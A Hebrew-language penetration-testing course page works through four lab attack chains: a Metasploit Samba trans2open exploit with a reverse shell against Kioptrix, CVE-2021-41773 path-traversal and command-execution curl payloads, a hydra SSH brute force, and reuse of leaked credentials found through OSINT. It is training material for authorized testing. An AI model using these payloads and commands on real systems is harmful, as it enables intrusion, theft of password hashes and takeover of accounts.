<div dir="rtl">

# 🌍 דוגמאות מהעולם האמיתי (Real-World Worked Examples)

> שרשראות תקיפה מלאות, צעד-אחר-צעד, כפי שהן קורות בבדיקת חדירות אמיתית. כל דוגמה מדגימה את המתודולוגיה מקצה לקצה על מכונת תרגול **חוקית**. שחזר אותן במעבדה שלך.
>
> ⚠️ כל הדוגמאות בוצעו על מכונות תרגול ייעודיות (VulnHub / TryHackMe). לעולם לא על מערכת אמיתית ללא רשות.

---

## דוגמה 1 — Kioptrix Level 1 (Linux, קל)

**התרחיש:** קיבלת IP יחיד במעבדה. המטרה: root.

### שלב 1 — Recon / גילוי
```bash
nmap -sn 192.168.56.0/24          # מציאת המכונה החיה
# → 192.168.56.101
```

### שלב 2 — Enumeration
```bash
nmap -sC -sV -p- -oN kioptrix.txt 192.168.56.101
```
פלט מפתח:
```text
22/tcp  open  ssh      OpenSSH 2.9p2
80/tcp  open  http     Apache 1.3.20 (mod_ssl/2.8.4 OpenSSL/0.9.6b)
139/tcp open  netbios  Samba
443/tcp open  ssl/http Apache/1.3.20
```
מנייה עמוקה יותר:
```bash
enum4linux -a 192.168.56.101      # → Samba 2.2.1a
nikto -h http://192.168.56.101    # → mod_ssl פגיע
```

### שלב 3 — חקר חולשות
```bash
searchsploit Samba 2.2            # → trans2open (CVE-2003-0201)
searchsploit mod_ssl 2.8          # → OpenFuck (CVE-2002-0082)
```
**שני וקטורים אפשריים.** נבחר ב-Samba (יציב ב-Metasploit).

### שלב 4 — ניצול
```bash
msfconsole
use exploit/linux/samba/trans2open
set RHOSTS 192.168.56.101
set LHOST 192.168.56.10           # Kali שלך
set PAYLOAD linux/x86/shell_reverse_tcp
exploit
```

### שלב 5 — הוכחה
```bash
whoami        # root
id            # uid=0(root)
cat /etc/shadow    # פרס — כל ה-Hashes
```

**לקח:** גרסאות ישנות (Apache 1.3.20, Samba 2.2.1a) → חולשות מוכרות → root. **המנייה הובילה ישירות לניצול.**

---

## דוגמה 2 — ניצול Web: Apache Path Traversal (CVE-2021-41773)

**התרחיש:** שרת web מריץ Apache 2.4.49 — גרסה עם חולשת Path Traversal מפורסמת.

### מנייה
```bash
nmap -sV -p 80 10.10.10.50        # → Apache/2.4.49
whatweb http://10.10.10.50
```

### חקר וניצול
חולשת **CVE-2021-41773** מאפשרת קריאת קבצים מחוץ ל-root של השרת:
```bash
# קריאת /etc/passwd דרך Path Traversal:
curl 'http://10.10.10.50/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'
```
אם `mod_cgi` מאופשר — אפשר להסלים ל-RCE (Remote Code Execution):
```bash
curl 'http://10.10.10.50/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' \
  --data 'echo Content-Type: text/plain; echo; id'
# → uid=1(daemon) — הרצת פקודות!
```

**לקח:** זיהוי **גרסה מדויקת** (2.4.49) הוא ההבדל בין "יש שרת web" ל-"יש לי RCE". תמיד `-sV`.

---

## דוגמה 3 — Brute Force ל-SSH (הקדמה למודול 8)

**התרחיש:** פורט 22 פתוח, אין Exploit לגרסה, אך יש שם משתמש שנחשף במנייה.

### מנייה
```bash
nmap -sV -p 22 10.10.10.60        # OpenSSH — אין Exploit ישיר
# במנייה קודמת מצאנו שם משתמש: "admin"
```

### תקיפת סיסמה
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.60
# → [22][ssh] host: 10.10.10.60  login: admin  password: password123
```

### גישה
```bash
ssh admin@10.10.10.60             # התחברות עם הפרטים שנמצאו
whoami
```

**לקח:** לא כל גישה מגיעה מ-Exploit. **סיסמה חלשה** היא לעיתים הדרך הקלה ביותר. (מודול 8 — Password Attacks.)

---

## דוגמה 4 — שרשרת אמיתית: Recon פסיבי → גישה ראשונית

**התרחיש:** בדיקת חדירות חיצונית (External) על ארגון. אין נקודת התחלה מלבד הדומיין.

### 1. OSINT פסיבי (מודול 5)
```bash
sublist3r -d company.com          # → dev.company.com נמצא
# hunter.io → תבנית מייל: {first}.{last}@company.com
# HaveIBeenPwned → מייל של עובד הופיע בדלף
```

### 2. גישה אקטיבית
```bash
nmap -sC -sV dev.company.com      # סביבת פיתוח חשופה, פורט 8080 פתוח
```
פאנל התחברות ב-`dev.company.com:8080`. עם פרטי הגישה שדלפו (מ-HIBP) — כניסה מצליחה (Credential Reuse).

**לקח:** **דלף מידע + סביבת פיתוח חשופה** = גישה ראשונית ללא ניצול טכני כלל. הגורם האנושי והתצורה החלשה הם לרוב הווקטור.

---

## מה משותף לכל הדוגמאות?

1. **המתודולוגיה זהה** תמיד: Recon → Enumeration → חקר חולשה → ניצול → הוכחה.
2. **מנייה יסודית** (במיוחד `-sV`) היא שקובעת את הצלחת הניצול.
3. **גרסאות ישנות, סיסמאות חלשות, ותצורה שגויה** הם הווקטורים הנפוצים — לא רק Exploits מתוחכמים.
4. **תיעוד** בכל שלב = הבסיס לדוח (מודול 16).

> 📤 בחר דוגמה, שחזר אותה במעבדה, ותעד כל צעד. זה התרגול הכי אפקטיבי.

[⬅️ חזרה למפת הקורס](../README.md) · [בנק שאלות](question-bank.md) · [מבחן מעשי](practical-exam.md)

</div>
